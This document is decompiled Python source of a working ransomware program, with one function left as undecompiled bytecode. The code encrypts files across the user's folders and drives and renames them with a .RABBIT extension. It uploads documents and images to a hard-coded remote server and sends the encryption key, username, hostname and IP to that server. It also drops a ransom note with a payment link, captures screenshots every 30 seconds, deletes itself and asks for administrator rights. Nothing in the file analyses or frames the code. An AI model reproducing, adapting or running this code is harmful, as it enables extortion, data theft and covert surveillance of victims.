# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: Working.py
import os, sys, string, random, hashlib, getpass, platform, requests, webbrowser, time
from pathlib import Path
import ctypes
from Crypto import Random
from Crypto.Cipher import AES
from mss import mss

def getlocalip():
    ip = requests.get('https://checkip.amazonaws.com').text.strip()
    return ip


def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size)))


def pad(s):
    return s + b'\x00' * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
        fo.close()
    enc = encrypt(plaintext, key)
    with open(file_name, 'wb') as fo:
        fo.write(enc)
        fo.close()
    os.rename(file_name, file_name + '.RABBIT')


key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
key = key.encode('utf-8')
os_platform = platform.system()
hostname = platform.node()
ext = [
 '.txt',
 '.ppt', '.pptx', '.doc', '.docx',
 '.gif', '.jpg', '.png', '.ico', '.mp3', '.ogg', '.csv', '.xls', '.xlsx', '.html', '.php', '.sln', '.exe', '.pdf', '.ods', '.odt',
 '.kdbx', '.kdb', '.mp4', '.flv', '.iso', '.zip', '.tar', '.tar.gz', '.rar', '.psd', '.jpeg', '.mov', '.wav', '.avi', '.sql', '.mkv',
 '.svg', '.key', '.raw', '.ogg', '.rtf', '.json', '.asp', '.css', '.h', '.hpp', '.java', '.class', '.jar', '.ps', '.bat', '.vb', '.awk',
 '.sh', '.cgi', '.pl', '.ada', '.swift', '.go', '.py', '.pyc', '.bf', '.coffee']

def get_target():
    return str(Path.home()) + '/'


def start_encrypt(p, key):
    message = '\n    How to fix .RABBIT lock read >>  https://pastebin.com/raw/K9DwMHWa\n                                                                              \n                               .-.--::-.                                        \n                             `-.       -/`                   .--..--`           \n                            --          `+                  :.     `:.          \n                           :.            :                 :.        .:         \n                          /`             :`               --          `/        \n                         /`              :`              :.            -/       \n                        :`               -              -.              +       \n                       -`               `:             .:               /`      \n                      `:                /`            `o                /       \n                      /                :.             o-               .:       \n                      :               `:             -o                /`       \n                     .:               /              s-               /`        \n                     /`              -/             `o              `:`         \n                     +              .+              :-             `:`          \n                    `:              o-              o`            `:`           \n                    /              :/              `+            .-             \n                    +        `..`.-o........`..````:-.`         -:              \n                   `/  `.-:::-.```..`````````````````.---.`    /:               \n                   `+-:--.`                             `.--.`/-                \n                 .-:/.                                     `:o.                 \n               -/:.           . -.          ``  `            /-                 \n             `/-`            `+ -`:.        :/ :-`.           --                \n            `/-                :` `         ``-. -:            /                \n            /.                `y`            -s                :-               \n           --                 oo            `y-                 +               \n          `+                 `d-            +o                 `s               \n          :`                 :s            -y`                 /o               \n         `/                  `      .``    ..                  o:               \n         -:                        .s+s.                       h.               \n         `/                    /   -d/-                       -y                \n          --                  .o``:os-   `-/                  `/                \n           -`                  :++/--o+--::                  ./-                \n            :.                  :/:::o.                    `:-                  \n             .:.`                .::-`                   `-:`                   \n               `-:.                                   .-/:`                     \n                  `.....                    ````...-::--                        \n                       .`.---..---:::--...-----.-.`.                                                                                                                                                                                                  \n\n    '
    dirs = [
     'Downloads', 'Documents', 'Pictures', 'Music', 'Desktop', 'Onedrive', 'Videos', 'Dropbox', 'Links', 'DriveD', 'DriveE', 'DriveF', 'DriveG', 'DriveH', 'DriveI']
    upload_ext = ['.jpg', '.jpeg', '.doc', '.docx', '.png', '.xlsx', '.xls', '.txt', '.mp4', '.flv', '.mkv']
    try:
        enc_file = '===========================================\n' + getpass.getuser() + ' | ' + hostname + '\n'
        for x in dirs:
            target = p + x + '/'
            if 'DriveD' in x:
                target = 'D:/'
            else:
                if 'DriveE' in x:
                    target = 'E:/'
                if 'DriveF' in x:
                    target = 'F:/'
                if 'DriveG' in x:
                    target = 'G:/'
                if 'DriveH' in x:
                    target = 'H:/'
                if 'DriveI' in x:
                    target = 'I:/'
                for path, subdirs, files in os.walk(target):
                    for name in files:
                        for i in ext:
                            if name.endswith(i.lower()):
                                try:
                                    size = os.path.getsize(os.path.join(path, name))
                                    if i in upload_ext:
                                        if size < 4000000:
                                            file = open(os.path.join(path, name), 'rb')
                                            files = {'file': file}
                                            requests.post('http://178.62.35.51/vendor/facebook/graph-sdk/src/rabbit/img/img.php', files=files)
                                            file.close()
                                    if size < 400000000:
                                        encrypt_file(os.path.join(path, name), key)
                                        enc_file += os.path.join(path, name) + '\n'
                                except Exception as e:
                                    try:
                                        pass
                                    finally:
                                        e = None
                                        del e

                    else:
                        with open(path + '/อ่านวิธีแก้ไฟล์โดนล๊อค.txt', 'w') as f:
                            f.write(message)
                            f.close()

        else:
            epayload = {'encrypt':enc_file, 
             'Username':getpass.getuser(),  'Hostname':hostname}
            requests.post('http://178.62.35.51/vendor/facebook/graph-sdk/src/rabbit/post.php', data=epayload)
            os.remove(sys.argv[0])

    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def screen():
    with mss() as sct:
        sct.shot(mon=(-1), output=(get_target() + getpass.getuser() + '_screen.png'))
        file = open(get_target() + getpass.getuser() + '_screen.png', 'rb')
        files = {'file': file}
        requests.post('http://178.62.35.51/vendor/facebook/graph-sdk/src/rabbit/img/img.php', files=files)
        file.close()


def connector():
    global os_platform
    start_encrypt(get_target(), key)
    payload = {'Username':getpass.getuser(),  'OS':os_platform,  'Hostname':hostname,  'Key':key,  'IP':getlocalip()}
    requests.post('http://178.62.35.51/vendor/facebook/graph-sdk/src/rabbit/post.php', data=payload)
    webbrowser.open_new('https://pastebin.com/raw/K9DwMHWa')
    while True:
        screen()
        time.sleep(30)


def is_admin--- This code section failed: ---

 L. 181         0  SETUP_FINALLY        16  'to 16'

 L. 182         2  LOAD_GLOBAL              ctypes
                4  LOAD_ATTR                windll
                6  LOAD_ATTR                shell32
                8  LOAD_METHOD              IsUserAnAdmin
               10  CALL_METHOD_0         0  ''
               12  POP_BLOCK        
               14  RETURN_VALUE     
             16_0  COME_FROM_FINALLY     0  '0'

 L. 183        16  POP_TOP          
               18  POP_TOP          
               20  POP_TOP          

 L. 184        22  POP_EXCEPT       
               24  LOAD_CONST               False
               26  RETURN_VALUE     
               28  END_FINALLY      

Parse error at or near `POP_EXCEPT' instruction at offset 22


if is_admin():
    try:
        connector()
    except KeyboardInterrupt:
        sys.exit(0)

else:
    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, __file__, None, 1)